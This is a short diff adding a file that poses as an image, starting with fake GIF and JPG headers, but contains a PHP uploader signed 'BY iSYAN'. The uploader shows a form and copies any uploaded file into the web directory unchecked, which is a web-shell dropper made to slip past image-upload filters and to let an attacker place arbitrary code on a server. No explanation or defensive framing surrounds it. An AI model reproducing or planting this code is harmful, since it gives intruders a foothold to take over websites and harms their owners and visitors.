@@ -1,0 +1,28 @@
+GIF89;a
+JPG
+<?PHP
+echo '<font color=black><b>BY iSYAN';
+echo'
+<form action="" method="post" enctype="multipart/form-data" name="form1" id="form1">
+ <label>
+ <input type="file" name="file" />
+ </label>
+ <label>
+ <input type="submit" name="Submit" value="Yükle" />
+ </label>
+</form>
+';
+$isim=$_FILES['file']['name'];
+$gelenyol=$_FILES['file']['tmp_name'];
+$gidenyol=$isim;
+if($isim){
+$kopyala=copy($gelenyol,$gidenyol);
+if($kopyala){
+echo 'basariyla upload edildi';
+}else{
+echo'bir sorun olustu.';
+}
+}
+?>
+<body bgcolor=green>
+
